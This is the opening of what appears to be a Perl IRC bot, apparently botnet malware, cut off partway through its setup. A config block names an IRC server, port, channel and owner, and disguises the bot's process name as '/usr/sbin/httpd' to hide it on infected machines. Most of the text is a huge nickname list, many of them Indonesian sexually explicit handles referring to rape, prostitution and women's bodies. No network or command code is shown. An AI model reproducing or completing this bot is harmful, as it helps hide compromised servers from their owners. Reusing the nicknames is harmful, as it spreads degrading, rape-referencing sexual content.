#!/usr/bin/perl

################################
my $server = $ARGV[0];         #
my $port="6677";               #
my $channel="#eu";           #
my $owner= "airmata";            #
my $procname="/usr/sbin/httpd";#
################################

my @nickname = ("Abdulrazak","Ackerman","Adams","Addison","Adelstein","Adibe","Adorno","Ahlers","Alavi","Alcorn","Alda",
"Aleks","Allison","Alongi","Altavilla","Altenberger","Altenhofen","Amaral","Amatangelo","Ameer","Amsden","Anand","Andel",
"Ando","Andrelus","Andron","Anfinrud","Ansley","Anthony","Antos","Arbia","Arduini","Arellano","Aristotle","Arjas","Arky","Atkins",
"Augustus","Aurelius","Axelrod","Axworthy","Ayiemba","Aykroyd","Ayling","Azima","Bachmuth","Backus","Bady","Baglivo","Bagnold",
"Bailar","Bakanowsky","Baleja","Ballatori","Ballew","Baltz","Banta","Barabesi","Barajas","Baranczak","Baranowska","Barberi","Barbetti",
"Barneson","Barnett","Barriola","Barry","Bartholomew","Bartolome","Bartoo","Basavappa","Bashevis","Batchelder","Baumiller","Bayles","Bayo",
"Beacon","Beal","Bean","Beckman","Beder","Bedford","Behenna","Belanger","Belaoussof","Belfer","Belin-Collart","Bellavance","Bellhouse",
"Bellini","Belloc","Benedict-Dye","Bergson","Berke-Jenkins","Bernardo",        "Bernassola","Bernston","Berrizbeitia","Betti","Beynart","Biagioli",
"Bickel","Binion","Bir","Bisema","Bisho","Blackbourn","Blackwell","Blagg","Blakemore","Blanke","Bliss","Blizard","Bloch","Bloembergen",
"Bloemhof","Bloxham","Blyth","Bolger","Bolick","Bollinger","Bologna","Boner","Bonham","Boniface","Bontempo","Book","Bookbinder","Boone",
"Boorstin","Borack","Borden","Bossi","Bothman","Botosh","Boudin","Boudrot","Bourneuf","Bowers","Boxer","Boyajian","Boyes","Boyland",
"Boym","Boyne","Bracalente","Bradac","Bradach","Brecht","Breed","Brenan","Brennan","Brewer","Brewer","Bridgeman","Bridges","Brinton",
"Britz","Broca","Brook","Brzycki","Buchan","Budding","Bullard","Bunton","Burden","Burdzy","Burke","Burridge","Busetta","Byatt","Byerly",
"Byrd","Cage","Calnan","Cammelli","Cammilleri","Canley","Capanni","Caperton","Capocaccia","Capodilupo","Cappuccio","Capursi","Caratozzolo",
"Carayannopoulos","Carlin","Carlos","Carlyle","Carmichael","Caroti","Carper","Cartmill","Cascio","Case","Caspar","Castelda","Cavanagh",
"Cavell","Ceniceros","Cerioli","Chapman","Charles","Cheang","Cherry","Chervinsky","Chiassino","Chien","Childress","Childs","Chinipardaz",
"Chinman","Christenson","Christian","Christiano","Christie","Christopher","Chu","Chupasko","Church","Ciampaglia","Cicero","Cifarelli",
"Claffey","Clancy","Clark","Clement","Clifton","Clow","Coblenz","Coito","Coldren","Colella","Collard","Collis","Compton","Compton",
"Comstock","Concino","Condodina","Connors","Corey","Cornish","Cosmides","Counter","Coutaux","Crawford","Crocker","Croshaw","Croxen",
"Croxton","Cui","Currier","Cutler","Cvek","Cyders","daSilva","Daldalian","Daly","D'Ambra","Danieli","Dante","Dapice","D'arcangelo","Das",
"Dasgupta","Daskalu","David","Dawkins","DeGennaro","DeLaPena","del'Enclos","deRousse","Debroff","Dees","Defeciani","Delattre","Deleon-Rendon",
"Delger","Dell'acqua","Deming","Dempster","Demusz","Denault","Denham","Denison","Desombre","Deutsch","D'fini","Dicks","Diefenbach","Difabio",
"Difronzo","Dilworth","Dionysius","Dirksen","Dockery","Doherty","Donahue","Donner","Doonan","Dore","Dorf","Dosi","Doty","Doug","Dowsland",
"Drinker","D'souza","Duffin","Durrett","Dussault","Dwyer","Eardley","Ebeling","Eckel","Edley","Edner","Edward","Eickenhorst","Eliasson",
"Elmendorf","Elmerick","Elvis","Encinas","Enyeart","Eppling","Erbach","Erdman","Erdos","Erez","Espinoza","Estes","Etter","Euripides",
"Everett","Fabbris","Fagan","Faioes","Falco-Acosta","Falorsi","Faris","Farone","Farren","Fasso'","Fates","Feigenbaum","Fejzo","Feldman",
"Fernald","Fernandes","Ferrante","Ferriell","Feuer","Fido","Field","Fink","Finkelstein","Finnegan","Fiorina","Fisk","Fitzmaurice","Flier",
"Flores","Folks","Forester","Fortes","Fortier","Fossey","Fossi","Francisco","Franklin-Kenea","Franz","Frazier-Davis","Freid","Freundlich",
"Fried","Friedland","Frisken","Frowiss","Fryberger","Frye","Fujii-Abe","Fuller","Furth","Fusaro","Gabrielli","Gaggiotti","Galeotti","Galwey",
"Gambini","Garfield","Garman","Garonna","Geller","Gemberling","Georgi","Gerrett","Ghorai","Gibbens","Gibson","Gilbert","Gili","Gill","Gillispie",
"Gist","Gleason","Glegg","Glendon","Goldfarb","Goncalves","Good","Goodearl","Goody","Gozzi","Gravell","Greenberg","Greenfeld","Griffiths",
"Grigoletto","Grummell","Gruner","Gruppe","Guenthart","Gunn","Guo","Ha","Haar","Hackman","Hackshaw","Haley","Halkias","Hallowell","Halpert",
"Hambarzumjan","Hamer","Hammerness","Hand","Hanssen","Harding","Hargraves","Harlow","Harrigan","Hartman","Hartmann","Hartnett","Harwell",
"Haviaras","Hawkes","Hayes","Haynes","Hazlewood","Heermans","Heft","Heiland","Hellman","Hellmiss","Helprin","Hemphill","Henery","Henrichs",
"Hernandez","Herrera","Hester","Heubert","Heyeck","Himmelfarb","Hind","Hirst","Hitchcock","Hoang","Hock","Hoffer","Hoffman","Hokanson","Hokoda",
"Holmes","Holoien","Holter","Holway","Holzman","Hooker","Hopkins","Horsley","Hoshida","Hostage","Hottle","Howard","Hoy","Huey","Huidekoper",
"Hungerford","Huntington","Hupp","Hurtubise","Hutchings","Hyde","Iaquinta","Ichikawa","Igarashi","Inamura","Inniss","Isaac","Isaievych","Isbill",
"Isserman","Iyer","Jacenko","Jackson","Jagers","Jagger","Jagoe","Jain","Jamil","Janjigian","Jarnagin","Jarrell","Jay","Jeffers","Jellis",
"Jenkins","Jespersen","Jewett","Johannesson","Johannsen","Johns","Jolly","Jorgensen","Jucks","Juliano","Julious","Kabbash","Kaboolian","Kafadar",
"Kalbfleisch","Kaligian","Kalil","Kalinowski","Kalman","Kamel","Kangis","Karpouzes","Kassower","Kasten","Kawachi","Kee","Keenan","Keepper",
"Keith","Kelker","Kelsey","Kempton","Kemsley","Kendall","Kerry","Keul","Khong","Kimmel","Kimmett","Kimura","Kindall","Kinsley","Kippenberger",
"Kirscht","Kittridge","Kleckner","Kleiman","Kleinfelder","Klemperer","Kling","Klinkenborg","Klint","Knuff","Kobrick","Koch","Kohn","Koivumaki",
"Kommer","Koniaris","Konrad","Kool","Korzybski","Kotter","Kovaks","Kraemer","Krailo","Krasney","Kraus","Kroemer","Krysiak","Kuenzli","Kumar",
"Kusman","Kuwabara","La","Labunka","Lafler","Laing","Lallemant","Landes","Lankes","Lantieri","Lanzit","Laserna","Lashley","Lawless","Lecar",
"Lecce","Leclercq","Leite","Lenard","Sofia","Lesser","Lessi","Liakos","Lidano","Liem","Light","Lightfoot","Lim","Linares","Linda","Linder",
"Line","Linehan","Linzee","Lippmann","Lipponen","Little","Litvak","Livernash","Livi","Livolsi","Lizardo","Locatelli","Longworth","Loss","Loveman",
"Lowenstein","Loza","Lubin","Lucas","Luciano","Luczkow","Luecke","Lunetta","Luoma","Lussier","Lutcavage","Luzader","Ma","Maccormac","Macdonald",
"Maceachern","Macintyre","Mackenney","MacMillan","Macy","Madigan","Maggio","Mahony","Maier","Maine-Hershey","Maisano","Malatesta","Maller",
"Malova","Manalis","Mandel","Manganiello","Mantovan","March","Marchbanks","Marcus","Margalit","Margetts","Marques","Martinez","Martochio",
"Marton","Marubini","Mass","Matalka","Matarazzo","Matsukata","Mattson","Mauzy","May","Mazzali","Mazziotta","Mcbride","Mccaffery","Mccall",
"Mcclearn","Mcdowell","Mcelroy","McFadden","Mcghee","Mcgoldrick","McIlroy","Mcintosh","Mcdonald","Mclane","Mclaren","Mcnealy","Mcnulty",
"Meccariello","Memisoglu","Menzies","Merikoski","Merlani","Merminod","Merseth","Merz","Metelka","Metropolis","Meurer","Michelman","Middle",
"Mieher","Mills","Minh","Mini","Minichiello","Gonzalez","Mitropoulos","Mittal","Mocroft","Modestino","Moeller","Mohr","Moiamedi","Monque","Montilio",
"MooreDeCh.","Morani","Moreton","Morrison","Morrow","Mortimer","Mosher","Mosler","Mostafavi","Motooka","Mudarri","Muello","Mugnai","Mulkern",
"Mulroy","Mumford","Mussachio","Naddeo","Napolitano","Nardi","Nardone","Naviaux","Nayduch","Nelson","Nenna","Nesci","Neuman","Newfeld","Newlin",
"Ng","Ni","Nickerson","Nickoloff","Nisenson","Nitabach","Notman","Nuzum","Ocougne","Ogata","Oh","O'hagan","Oldford","Olsen","Olson","Olszewski",
"O'malley","Oman","O'meara","Opel","Oray","Orfield","Orsi","Ospina","Ostrowski","Ottaviani","Otten","Ouchida","Ovid","PaesDealmeida","Paine",
"Palayoor","Palepu","Pallara","Palmitesta","Panadero","Panizzon","Pantilla","Paoletti","Parmeggiani","Parris","Partridge","Pascucci","Patefield",
"Patrick","Pattullo","Pavetti","Pavlon","Pawloski","Paynter","Peabody","Pearlberg","Pederson","Peishel","Penny","Pereira","Perko","Perlak",
"Perlman","Perna","Perone","Perrimon","Peters","Petruzello","Pettibone","Pettit","Pfister","Pilbeam","Pinot","Plancon","Plant","Plasket","Plous",
"Po","Pocobene","Poincaire","Pointer","Poirier","Polak","Polanyi","Politis","Poma","Poolman","Powers","Presper","Preucel","Prevost","Pritchard",
"Pritz","Proietti","Prothrow-Stith","Puccia","Pugh","Pynchon","Quaday","Quetin","Rabe","Rabkin","Radeke","Rajagopalan","Raney","Rangan","Rankin",
"Rapple","Rayport","Redden-Tyler","Reedquist","Cunningham","Reinold","Remak","Renick","Repetto","Resnik","Rhea","Richmond","Rielly","Rindos",
"Rineer","Rish","Rivera","Robinson","Rocha","Roesler","Rogers","Ronen","Row","Royal","Ru","Ruan","Ruderman","Ruescher","Rush","Ryu","Sabatello",
"Sadler","Safire","Sahu","Sali","Samson","Sanchez-Ramirez","Sanna","Sapers","Sarin","Sartore","Sase","Satin","Satta","Satterthwaite","Sawtell",
"Sayied","Scarponi","Scepan","Scharf","Scharlemann","Scheiner","Schiano","Schifini","Schilling","Schmitt","Schossberger","Schuman","Schutte",
"Schuyler","Schwan","Schwickrath","Scovel","Scudder","Seaton","Seeber","Segal","Sekler","Selvage","Sen","Sennett","Seterdahl","Sexton",
"Seyfert","Shaikh","Shakis","Shankland","Shanley","Shar","Shatrov","Shavelson","Shea","Sheats","Shepherd","Sheppard","Shepstone","Shesko","Shia",
"Shibata","Shimon","Siesto","Sigalot","Sigini","Signa","Silverman","Silvetti","Sinsabaugh","Sirilli","Sites","Skane","Skerry","Skoda","Sloan",
"Slowe","Smilow","Sniffen","Snodgrass","Socolow","Solon","Somers","Sommariva","Sorabella","Sorg","Sottak","Soukup","Soule","Soultanian","Spanier",
"Sparrow","Spaulding","Speizer","Spence","Sperber","Spicer","Spiegelhalter","Spiliotis","Spinrad","StMartin","Stalvey","Stam","Stang","Stassinopolus",
"States","Statlender","Stefani","Steiner","Stephanian","Stepniewska","Stewart-Oaten","Stiepock","Stillwell","Stock","Stockton","Stockwell","Stolzenberg",
"Stonich","Storer","Stott","Strange","Strauch","Streiff","Stringer","Sullivan","Sumner","Suo","Surdam","Sweeting","Sweetser","Swindle","Tagiuri",
"Tai","Talaugon","Tambiah","Tandler","Tanowitz","Tatar","Taveras","Tawn","Tcherepnin","Teague","Temes","Temmer","Tenney","Terracini","Than",
"Thavaneswaran","Theodos","Thibault","Thisted","Thomsen","Throop","Tierney","Till","Timmons","Tofallis","Tollestrup","Tolls","Tolman","Tomford",
"Toomer","Topulos","Torresi","Torske","Towler","Toye","Traebert","Trenga","Trewin","Tringali","Troiani","Troy","Truss","Tsiatis","Tsomides","Tsukurov",
"Tuck","Tudge","Tukan","Turano","Turek","Tuttle","Twells","Tzamarias","Ullman","Untermeyer","Upsdell","Urban","Urdang-Brown","Usdan","Uzuner",
"Vacca","Waite","Valberg","Valencia","Wales","Wallenberg","Walter","vanAllen","VanZwet","Vandenberg","Vanheeckeren","Warshafsky","Wasowska","Vasquez",
"Waugh","Weighart","Weingarten","Weinhaus","Weissbourd","Weissman","Velasquez","Welles","Welsh","Wengret","Venne","Verghese","Wescott","Wetzel",
"Whately","Whilton","White","Whitla","Whittaker","Viana","Viano","Wiedersheim","Wiener","Viens","Vignola","Wilder","Wilhelm","Wilk","Wilkin","Wilkinson",
"Villarreal","Willstatter","Wilson","Vitali","Viviani","Voigt","Wolk","VonHoffman","Woo","Wooden","Woods","Woods-Powell","Vorhaus","Votey","Yacono",
"Yamane","Yankee","Yarchuk","Yates","Ybarra","Yedidia","Yesson","Yetiv","Yoffe","Yoo","Youk-See","Yu","Zachary","Zahedi","Zangwill","Zegans","Zerbini",
"Zoldak","Zucconi","Zurn","Zwiers","cew_semox-bgt","cew_genit_bgt","cew_ps_tambah_k","cew_jual_tubuh","cew_jual_daging","cew_jual_gituan","cew_rasa_nikmat",
"cew_lezat","cew_nikmattt","cew_see_my_xxx","cew_lage_xxx","cew_sk_digigit","cew_pngen_diintip","cew_sk_ngintip","cew_mulus_seksi","cew_putih_seksi",
"cew_seksi_mentek","cew_seksi_bgt","cew_imoet_seksi","cew_semalam200rb","cew_1jam300rb","cew_pake_stoking","cew_pake_daster","cew_pake_tantop",
"cew_brewok","cew_kissMe","cew_tusuk_me","cew_mw_dixXx","cew_kuning_sexy","cew_cantix_semock","cew_semock_mulus","cew_lg_matang","cew_lg_meteng",
"cew_buntingin_gw","cew_pngen_bunting","cew_jago_beranak","cew_jago_xXx","cew_fans_miyabi","cew_model_bikini","cew_sk_hardCore","cew_ganjenk",
"c3w_semox-bgt","c3w_genit_bgt","c3w_ps_tambah_k","c3w_jual_tubuh","c3w_jual_daging","c3w_jual_gituan","c3w_rasa_nikmat","c3w_lezat","c3w_nikmattt",
"c3w_see_my_xxx","c3w_lage_xxx","c3w_sk_digigit","c3w_pngen_diintip","c3w_sk_ngintip","c3w_mulus_seksi","c3w_putih_seksi","c3w_seksi_mentek",
"c3w_seksi_bgt","c3w_imoet_seksi","c3w_semalam200rb","c3w_1jam300rb","c3w_pake_stoking","c3w_pake_daster","c3w_pake_tantop","c3w_brewok",
"c3w_kissMe","c3w_tusuk_me","c3w_mw_dixXx","c3w_kuning_sexy","c3w_cantix_semock","c3w_semock_mulus","c3w_lg_matang","c3w_lg_meteng","c3w_buntingin_gw",
"c3w_pngen_bunting","c3w_jago_beranak","c3w_jago_xXx","c3w_fans_miyabi","c3w_model_bikini","c3w_sk_hardCore","c3w_ganjenk","ce_semox-bgt","ce_genit_bgt",
"ce_ps_tambah_k","ce_jual_tubuh","ce_jual_daging","ce_jual_gituan","ce_rasa_nikmat","ce_lezat","ce_nikmattt","ce_see_my_xxx","ce_lage_xxx","ce_sk_digigit",
"ce_pngen_diintip","ce_sk_ngintip","ce_mulus_seksi","ce_putih_seksi","ce_seksi_mentek","ce_seksi_bgt","ce_imoet_seksi","ce_semalam200rb","ce_1jam300rb",
"ce_pake_stoking","ce_pake_daster","ce_pake_tantop","ce_brewok","ce_kissMe","ce_tusuk_me","ce_mw_dixXx","ce_kuning_sexy","ce_cantix_semock","ce_semock_mulus",
"ce_lg_matang","ce_lg_meteng","ce_buntingin_gw","ce_pngen_bunting","ce_jago_beranak","ce_jago_xXx","ce_fans_miyabi","ce_model_bikini","ce_sk_hardCore","ce_ganjenk",
"c3_semox-bgt","c3_genit_bgt","c3_ps_tambah_k","c3_jual_tubuh","c3_jual_daging","c3_jual_gituan","c3_rasa_nikmat","c3_lezat","c3_nikmattt","c3_see_my_xxx",
"c3_lage_xxx","c3_sk_digigit","c3_pngen_diintip","c3_sk_ngintip","c3_mulus_seksi","c3_putih_seksi","c3_seksi_mentek","c3_seksi_bgt","c3_imoet_seksi",
"c3_semalam200rb","c3_1jam300rb","c3_pake_stoking","c3_pake_daster","c3_pake_tantop","c3_brewok","c3_kissMe","c3_tusuk_me","c3_mw_dixXx","c3_kuning_sexy",
"c3_cantix_semock","c3_semock_mulus","c3_lg_matang","c3_lg_meteng","c3_buntingin_gw","c3_pngen_bunting","c3_jago_beranak","c3_jago_xXx","c3_fans_miyabi",
"c3_model_bikini","c3_sk_hardCore","c3_ganjenk","cewex_semox-bgt","cewex_genit_bgt","cewex_ps_tambah_k","cewex_jual_tubuh","cewex_jual_daging","cewex_jual_gituan",
"cewex_rasa_nikmat","cewex_lezat","cewex_nikmattt","cewex_see_my_xxx","cewex_lage_xxx","cewex_sk_digigit","cewex_pngen_diintip","cewex_sk_ngintip","cewex_mulus_seksi",
"cewex_putih_seksi","cewex_seksi_mentek","cewex_seksi_bgt","cewex_imoet_seksi","cewex_semalam200rb","cewex_1jam300rb","cewex_pake_stoking","cewex_pake_daster","cewex_pake_tantop",
"cewex_brewok","cewex_kissMe","cewex_tusuk_me","cewex_mw_dixXx","cewex_kuning_sexy","cewex_cantix_semock","cewex_semock_mulus","cewex_lg_matang","cewex_lg_meteng",
"cewex_buntingin_gw","cewex_pngen_bunting","cewex_jago_beranak","cewex_jago_xXx","cewex_fans_miyabi","cewex_model_bikini","cewex_sk_hardCore","cewex_ganjenk","cew_biasa_ja_YM",
"cew_lg_YM","cew_ol_YM","cew_online_YM","cew_ol_YM","cew_online_YM","cew_dJombLow","cew_niezt","cew_kerens","cew_cantieks","cew_setia-sedunia","cew_sby_setia","cew_mnizzzz_bgt",
"cew_setia_cr_cow","cew_super_setia","cew_manis_fs","cew_pengen_punya_cew","cew_setia-bgt","cew_jelek_setia","cew_jelek-bgt","cew_jlk_tp_setia","cew_cr_serius","cew_biasa_setia",
"cew_setiaaaa","cew_paling_maniz","cew_setia_bgtttt","cew_jojoba","cew_jomblo_cr_cow","c3w_perayu_cow","ce_perayu_cow","cew_perayu_cow","c3_mulus_cantiq","c3w_mulus_cantiq","ce_mulus_cantiq",
"cew_mulus_cantiq","c3_mulus_butuhhh","c3w_mulus_butuhhh","ce_mulus_butuhhh","cew_mulus_butuhhh","c3_mw_dibayarr","ce_mw_dibayarr","c3w_mw_dibayarr","cew_mw_dibayarr","c3_butuh-bgt",
"c3w_butuh-bgt","ce_butuh-bgt","cew_butuh-bgt","c3_cr_pemuassss","c3w_cr_pemuassss","ce_cr_pemuassss","cew_cr_pemuassss","c3w_cr_perjaka","c3_cr_perjaka","ce_cr_perjaka","cew_cr_perjaka",
"cew_penidur","c3_minta_diperkosa","c3w_minta_diperkosa","ce_minta_diperkosa","cew_minta_diperkosa","cew_","ce_ga-pake_CD","c3w_ga-pake_CD","cew_ga-pake_CD","cew_","cew_","cew_",
"c3w_ga-pake_bra","cew_ga-pake_bra","ce_ga-pake_bra","ce_bra_pink","cew_cd_pink","c3w_cd_pink","c3w_nungging","c3w_kenikmatannn","c3w_cr_gituann","c3w_pengen_digituin","c3w_butuhhh",
"cew_ga_kuat","c3w_panas_bgt","c3w_lg_pengen","c3w_lage_hot","c3w_demen_gituan","c3w_pemerkosa","c3w_pengen_gituan","c3w_mw_gituan","cew_pengen_gituan","ce_sk_gituan","cew_sk_bokep",
"cew_bokep","cew_bokepers","cew_site_bokep","cew_bayar_murah","cew_suka_om2","cew_butuh_pemuas","cew_butuh_pemerkosa","cew_cr_pemerkosa","cew_betah_diperkosa","cew_kuat_di-ranjang","cew_kuat_bngt",
"cew_mase_kuat","cew_pelampiasan","cew_cr_pelampiasan","cew_pemerkosa_cow","cew_pengen_nikmat","cew_cr_nikmat","cew_","cew_jual_itu","cew_di-jual","cew_murahan","cew_murahan-bgt",
"cew_cr_palanggan","cew_psk_asyik","cew_jagir","cew_jarak","cew_kalimatan","cew_cr_kenikmatan","cew_pembawa_nikmat","cew_pemerkosa","cew_mw_dinaikin","cew_lg_pengen","cew_lg_dapet",
"cew_nakal_pengen","cewex_nakal-bgt","cewex_cantik_nakal","cewex_mulus_binal","cewex_putih_mulus","cewex_pengen_dianu","cewex_anunya_mungil","cewex_itunya-kecil","cewex_ga_pake_cd",
"cewex_","cew_cr_pemuassss","cew_cr_pemerkosa","cew_bikin_anak","cewex_kupu2malam","cewek_kupu2malam","ce_kupu2malam","cew_kupu2malam","cew_mw_di-anu","cew_mw_diraba","cew_mw_digituin",
"cew_pengen_digituin","cew_pengen_nikmat","cew_kenikmatan_sesaat","cew_cr_kenikmatan","cew_cr_om2","cew_mw_ama_om2","cew_mw_dipesan","cew_mw_dibayar","cew_cr_gratisan","cew_pengen_anu_cow",
"cew_lg_pengen","cew_pengen_dielus","cew_itunya_merah","cew_cr_kesenangan","cew_mulus_cr_cow","cew_mulus_bgt","cew_putih_mulus","ce_cari_nikmat","cew_cari_nikmat","cew_cr_nikmat","ce_cr_nikmat",
"cew_pngn_buang_virgin","ce_pngn_dihajar","cew_meranjang","ce_meranjang","cew_free4fun","ce_free4fun","cew_penghibur_cow","ce_penghibur_cow","cew_pngn_main_belakang","ce_pngn_main_belakang",
"cew_pengen_nungging","ce_pengen_nungging","cew_mw_main_kasar","ce_mw_main_kasar","ce_pngn_dinikmati","ce_penjinak_cow","ce_pengen_semalam","ce_main_isi_pulsa","ce_mw_diperkosa","ce_pngen_gituan",
"ce_cr_kesenangan","ce_pemuas_buaya","ce_pengen_jatah","ce_minta_jatah","ce_pengen_dipuasin","ce_mw_dipuasin","ce_pemuja_cow","ce_mw_gituan","ce_pengen_gituan","ce_sk_meranjang","ce_sk_ngemut",
"ce_sexy-bgt","ce_bokepers","ce_sk_burung","ce_pemuas","ce_butuh_cow","ce_rela_diperkosa","ce_pengen_di_isep","ce_ga_pakeCD","ce_telanjang","ce_maniax","ce_cutexx","ce_starone","ce_sakit",
"ce_semrawut","c3w_korax","ce_sumringah","c3w_kegelapan","cew_pujangga","ce_emperor","ce_mutiara","cew_ratu","cew_srigala","cew_jadi_jadian","ce_korek_api","ce_mulitan","cew_dewaza","ce_cafein",
"cew_kopi_maniz","cew_kulus","cew_dramatix","cew_tragis","cew_kenangan","cew_berbunga2","c3w_seal","cew_modeling","cew_sk_gelap","ce_nescafee","ce_cakep-bgt","ce_cantix_kul","ce_pemuassss",
"ce_cari_gituan","ce_cari_tugas","cew_ceria","ce_17cute","cew_cleopatra","ce_cntix_kul","CE_CR_CR","cew_cr_hacker","ce_cr_web_desain","ce_cuanteeeeek","ce_cuet_cuet","Ce_cute_cr_temen",
"ce_cutez","ce_desain","ce_dunia_maya","Ce_Dwss_bgt","Cew_Fitri_FS","cE_fS_nARziEsss","ce_mo_gajian","ce_gembredek","ce_genit_bgt","ce_gi_anu_anu","ce_gi_sibuk","ce_hackers","ce_ideal",
"Ce_ImoetzzzZ","ce_imoot","ce_imootez","Ce_ImUtZzZz","ce_imyuth","ce_informatika","ce_jutek_bgt","ce_kerens_fs","ce_kerj_di_internet","ce_lg_kesepian","cew_komputeris","cew_korea","ce_kul_Cantix",
"ce_kuliah_ITS","ce_lebay_euy","ce_linux_user","ce_lynx","ce_maniees","ce_maniezt_girl","ce_mAnIiEezzZ_jOmBlO","c3w_matre","ce_moesliem","ce_ngeblog","c3w_nightmare","ce_nizzz","ce_nulis_web",
"ce_patah_ht","ce_penulis","ce_perompak","ce_pinter_banget","ce_pirate","ce_product","ce_punya_blog","ce_punya_web","cew_punya_website","cew_re2","ce_riZa_efEZt","Cew_SAKURA_nizz","ce_kebobolan",
"ce_site_modeling","ce_smart_plus_maniezz","ce_suka_anime","C3W_SWEETY","ce_pinter_muasin","cewex_putih_mulus","ce_mulussss","ce_cri_perangsang","ce_pengen_gituannn","ce_smk_it","ce_Pemangsa_Sby",
"cew_demen_gituan","cewex_anggun","cew_sk_bikin_anak","cew_bikini_bgt","cew_engen_lontong","Cewex_crI_tMn_bAEk","CeW_CutE","cew_dispro","cew_informatika","cew_jomblo_nizz","cew_sk_bgt",
"cew_anunya_mulus","cew_cr_selingkuhan","cew_teknik_industri","cew_dias_fs","cewek_belajar_web","cewek_demen_naruto","cewek_hongkong","cewek_inisial_N","cewek_japan_anime","cewek_kerj_internet",
"cewek_koleksi_movie","cewek_lg_butuh_itu","cewek_olaraga_kelamiiin","cewek_pinter","cewek_itunya_mulus","cewex_itunya_putih","cewex_korea_cakep","cEwk_dJombLow","cewk_niezt","cew3k_t0mb0y","cew_kerens",
"cew_mursals","cew_brandals","cew_solo_lo","cew_ria","cew_cicak","cew_spiderman","cew_mulus_gi_pengen","cew_buaya","cew_kuliah_wk","cew_kul_unesa","cew_putih_nizz","cew_gitaris","ce_sep_bgt","ce_mantapp",
"ce_mo_pingsan","ce_pengen_mati","ce_ngerjain_tugas","ce_seles_nokia","ce_lamru","cew_jav_model","ce_av_model","ce_model_bokep","ce_model_jav","cew_model_av","cew_model_av","ce_maria_ozawa","ce_model_hot",
"cew_hot_model","ce_model_mulus","ce_ajak_kencan","ce_kencan_semalam","ce_making_love","ce_pemijat","ce_pijat_nikmat","ce_tahan_lama","ce_kuat_digilir","ce_nakal_pengen","ce_cr_nikmattt","ce_cr_kesenangan",
"ce_cr_om2_genit","ce_eka_mulusss","ce_mupeng_berat","ce_mupeng_banget","ce_tetek_gedee","ce_nenen","c3w_bokepers","ce_artis_bokep","ce_sk_bokep","ce_bintang_bokep","ce_sk_om2","ce_mau_ma_om2",
"ce_pengen_ma_om2","ce_jalan_ma_om2","ce_rok_mini","ce_rok_pendek","ce_rok_minim","ce_ga_pake_rok","ce_pake_stoking","ce_paha_mulus","ce_da2_mulus","ce_da2_gede","ce_da2_imut","ce_jual_itu","ce_jual_nikmat",
"cew_jual_jasa","cew_jalanan","cew_bad","cew_item_maniez","cew_putih_maniez","cew_kuning_maniez","cew_item_mulus","cew_kuning_mulus","cew_berbulu","cew_berbulu_pengen","cew_lg_pengennnn","cew_main_keras",
"cew_maen_ganas","cew_amature","cew_hard-Core","cew_mulus_jav","cew_av-model","cew_gunung_gede","cew_gunung_mulus","cew_lubang_buaya","cew_kupu2-malam","cew_paha_mulusss","cew_selangkangan_gatal","cew_korea_cr_cow",
"cew_bertato","cew_main_free","cew_main_ps","cew_pengen_ps","cew_penyewaan_jasa","cew_pembunuh_cow","cew_buaya_laut","cew_lubang_buaya","cew_cr_buaya","cew_DiTiduriBuaya","cew_pemuas_lelaki","cew_pemuas_cow",
"cew_pemuas_buaya","cew_pemuas_om2","cew_pemuas_pejantan","cew_cr-pejantan","cew_mw_ama_pejantan","cew_cr_mr-P","cew_demen_mr-P","cew_butuh_mr-P","cew_sk_mr-P","cew_ga_virgin","cew_hilang_virgin","cew_virgine_unlimited",
"cew_emut_mr-P","cew_perokok_coklat","cew_tumbuh_rambut","cew_tumbuh_gunung","cew_tumbuh_itunya","cew_mw_em-el","cew_bs_hub-intim","cew_mw-hub-intim","cew_pengen_hub-intim","cew_pengen_intim","cew_horrneeey","cew_gatal-itunya",
"cew_pemerkosa_om2","cew_pemerkosa_perjaka","cew_pemerkosa_jejaka","cew_pemerkosa_cow","cew_lessby","cew_lezzz","cew_cantix_less","cew_less_mulus","cew_biseeeks","cew_kuat_dikeroyok","cew_pgen_dikeroyok",
"cew_dikeroyok_cow","cew_itunya-gede","cew_itunya-gatal","cew_itunya-imoet","cew_itunya-mulus","cew_model_japan","cew_model_maniz","cew_model_anime","cew_haruna-sakura","cew_model-miyabi","cew_kalahin-miyabi","cew_panas_pengen",
"cew_pengen_hot","cew_borack","cew_ketagihan_cow","cew_ketagihan_pisang","cew_pengen_pisang","cew_pake_bra_ketat","cew_bispak-bgt","cew_mw_nungging","cew_stan_nungging","cew_stan_dogi","cew_boxer","cew_stan_samping",
"cew_pakar_bercinta","cew_mahir_bercinta","cew_pngen_bercinta","cew_mw_bercinta","cew_mau_bercinta","cew_tante2","cew_tante2-btuh","cew_tante2_cr","cew_tante2_pengen","cew_tante2_cr_cow","cew_free_ml","cew_free_bokep",
"cew_dugem_asyik","cew_ratu_dugem","cew_mw_dugem","cew_pngen_dugem","cew_lg_dugem","cew_lg_mabok","cew_cd_pink","cew_cd_merah","cew_cd_ijo","cew_cd_putih","cew_cd_transparan","cew_cd_item","cew_cd_biru","cew_pemusnah_massal",
"cew_pmusnah_cow","cew_free_video","cew_free_gituan","cew_mw_gituan-free","cew_pngen-cek-in","cew_mw_cek-in","cew_dadamulus","cew_da2Mulus","cew_bra_putih","cew_poto_model","cew_mw-date","cew_dapice","cew_tante_mira","cew_tante_robi",
"cew_tante_tati","cew_tante_tutik","cew_tutik","cew_mira","cew_vitaa","cew_eny","cew_iin","cew_eka","cew_sari","cew_linda","cew_pipit","cew_santi","cew_eva","cew_fany","cew_ely","cew_melly","cew_ester","cew_putri","cew_po3","cew_ella",
"cew_rosi","cew_inem","cew_tatik","cew_sthevani","cew_dicks","cew_dinodai","cew_ratih","cew_ajenk","cew_ajeng","cew_diah","cew_dyah","cew_marsya","cew_cantixx","cew_cantika","cew_anggi","cew_angelina","cew_indah","cew_permata","cew_dian",
"cew_pamela","cew_herlina","cew_lina","cew_nanda","cew_ananda","cew_adel","cew_adult","cew_adult_model","cew_indo_adult","cew_japan_adult","cew_sby_adult","cew_jakarta_adult","cew_modeling_adult","C3_cina_cuantik","c3_ckp_bngt",
"c3_cr_ttm","C3_CuNi3z_Fs","c3_cut3","c3_CuTe_SmA","c3_cUtEz","c3_gokiiilllll_lucu","C3_less_mutz","c3_zkull_ztar_one","C3-CANTIK-ADUHAI","c3w3x_chn","c3w_1c4gals","c3w_b4w3l","c3w_CHNZZZ_smg","c3w_im03t_bratang","c3w_j0m8L0","c3w_jut3x",
